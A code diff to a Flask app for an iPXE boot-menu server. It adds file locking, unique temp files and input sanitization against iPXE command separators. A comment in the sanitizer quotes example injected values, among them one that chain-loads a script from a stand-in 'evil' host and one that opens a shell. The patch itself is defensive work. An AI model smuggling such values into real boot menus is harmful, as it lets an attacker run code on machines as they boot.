@@ -2,7 +2,9 @@ import os
 import re
 import json
 import uuid
+import fcntl
 import pathlib
+from contextlib import contextmanager
 from urllib.parse import quote
 
 from flask import Flask, request, jsonify, render_template, Response
@@ -42,19 +44,38 @@ def load_entries():
 def save_entries(entries):
     # ENTRIES_FILE lives on a directory bind mount, so tmp+rename is atomic
     # and visible on the host (renaming onto a single-file mount would EBUSY).
+    # Unique temp name so two concurrent writers never share a tmp file.
     ENTRIES_FILE.parent.mkdir(parents=True, exist_ok=True)
-    tmp = ENTRIES_FILE.with_suffix('.tmp')
+    tmp = ENTRIES_FILE.with_name(f'.entries.{uuid.uuid4().hex}.tmp')
     tmp.write_text(json.dumps(entries, indent=2))
     tmp.replace(ENTRIES_FILE)
+
+
+@contextmanager
+def entries_lock():
+    # Serializes read-modify-write across gunicorn's 2 processes x 8 threads;
+    # a threading.Lock would only cover one process. fcntl is fine on Linux.
+    ENTRIES_FILE.parent.mkdir(parents=True, exist_ok=True)
+    lockfile = ENTRIES_FILE.with_name('.entries.lock')
+    with open(lockfile, 'w') as lf:
+        fcntl.flock(lf, fcntl.LOCK_EX)
+        try:
+            yield
+        finally:
+            fcntl.flock(lf, fcntl.LOCK_UN)
 
 # ── input sanitization ───────────────────────────────────────────────────────
 
 _CTRL = re.compile(r'[\x00-\x1f\x7f]')
+# iPXE splits a line into separate commands on these tokens, so a value like
+# "quiet || chain http://evil/x.ipxe" on the kernel line, or "Ubuntu && shell"
+# on an item line, would execute injected commands during menu construction.
+_IPXE_SEP = re.compile(r'\|\||&&|;')
 
 def _clean(value, maxlen=200):
-    # iPXE scripts are newline-delimited: control chars in any field would
-    # let a client inject arbitrary boot directives into menu.ipxe.
-    return _CTRL.sub(' ', str(value)).strip()[:maxlen]
+    v = _CTRL.sub(' ', str(value))
+    v = _IPXE_SEP.sub(' ', v)
+    return v.strip()[:maxlen]
 
 def sanitize_fields(data):
     """Whitelist, clean and validate entry fields. Returns (fields, error)."""
@@ -131,10 +152,12 @@ def generate_menu(entries):
             kernel  = e.get('kernel', '')
             initrd  = e.get('initrd', '')
             cmdline = e.get('cmdline', '')
-            # args go on the kernel line so no imgargs name-matching is needed
-            lines.append(f'kernel {file_url(kernel)}' + (f' {cmdline}' if cmdline else ''))
+            # args go on the kernel line so no imgargs name-matching is needed.
+            # every fetch needs '|| goto failed' — iPXE aborts the whole script
+            # on the first unhandled command failure (e.g. a deleted file 404s)
+            lines.append(f'kernel {file_url(kernel)}' + (f' {cmdline}' if cmdline else '') + ' || goto failed')
             if initrd:
-                lines.append(f'initrd {file_url(initrd)}')
+                lines.append(f'initrd {file_url(initrd)} || goto failed')
             lines.append('boot || goto failed')
         elif t == 'iso':
             lines.append(f'sanboot {file_url(e.get("iso", ""))} || goto failed')
@@ -187,9 +210,9 @@ def api_upload():
         return jsonify({'error': 'Invalid filename'}), 400
     UPLOAD_DIR.mkdir(parents=True, exist_ok=True)
     dest = UPLOAD_DIR / filename
-    # stream to a hidden temp name so webfs never serves a half-written file,
-    # then rename into place on success
-    tmp = UPLOAD_DIR / f'.{filename}.uploading'
+    # stream to a hidden, unique temp name so webfs never serves a half-written
+    # file and two concurrent uploads of the same name can't corrupt each other
+    tmp = UPLOAD_DIR / f'.{filename}.{uuid.uuid4().hex}.uploading'
     try:
         f.save(str(tmp))
         tmp.replace(dest)
@@ -223,9 +246,10 @@ def api_add_entry():
     # ids double as iPXE goto labels; leading letter keeps them unambiguous
     entry = {'id': 'e' + uuid.uuid4().hex[:7], 'type': 'kernel', 'enabled': True}
     entry.update(fields)
-    entries = load_entries()
-    entries.append(entry)
-    save_entries(entries)
+    with entries_lock():
+        entries = load_entries()
+        entries.append(entry)
+        save_entries(entries)
     return jsonify(entry), 201
 
 @app.route('/api/entries/<eid>', methods=['PUT'])
@@ -233,36 +257,39 @@ def api_update_entry(eid):
     fields, err = sanitize_fields(request.get_json(force=True) or {})
     if err:
         return jsonify({'error': err}), 400
-    entries = load_entries()
-    for i, e in enumerate(entries):
-        if e['id'] == eid:
-            entries[i] = {**e, **fields, 'id': eid}
-            save_entries(entries)
-            return jsonify(entries[i])
+    with entries_lock():
+        entries = load_entries()
+        for i, e in enumerate(entries):
+            if e['id'] == eid:
+                entries[i] = {**e, **fields, 'id': eid}
+                save_entries(entries)
+                return jsonify(entries[i])
     return jsonify({'error': 'Not found'}), 404
 
 @app.route('/api/entries/<eid>', methods=['DELETE'])
 def api_delete_entry(eid):
-    save_entries([e for e in load_entries() if e['id'] != eid])
+    with entries_lock():
+        save_entries([e for e in load_entries() if e['id'] != eid])
     return jsonify({'ok': True})
 
 @app.route('/api/entries/reorder', methods=['POST'])
 def api_reorder():
     order = (request.get_json(force=True) or {}).get('order', [])
-    entries = load_entries()
-    by_id = {e['id']: e for e in entries}
-    reordered = [by_id[eid] for eid in order if eid in by_id]
-    # entries the client didn't know about (added concurrently) must survive
-    listed = set(order)
-    reordered += [e for e in entries if e['id'] not in listed]
-    save_entries(reordered)
+    with entries_lock():
+        entries = load_entries()
+        by_id = {e['id']: e for e in entries}
+        reordered = [by_id[eid] for eid in order if eid in by_id]
+        # entries the client didn't know about (added concurrently) must survive
+        listed = set(order)
+        reordered += [e for e in entries if e['id'] not in listed]
+        save_entries(reordered)
     return jsonify({'ok': True})
 
 if __name__ == '__main__':
-    import subprocess
+    # Dev/local convenience only — the container runs gunicorn as its CMD.
     # gthread: heartbeat stays in the main thread, so multi-GB uploads in
-    # worker threads are not killed by the arbiter timeout (sync workers are)
-    subprocess.execvp('gunicorn', [
+    # worker threads are not killed by the arbiter timeout (sync workers are).
+    os.execvp('gunicorn', [
         'gunicorn', '-w', '2', '-k', 'gthread', '--threads', '8',
         '--timeout', '120', '-b', '0.0.0.0:8091', 'app:app',
     ])
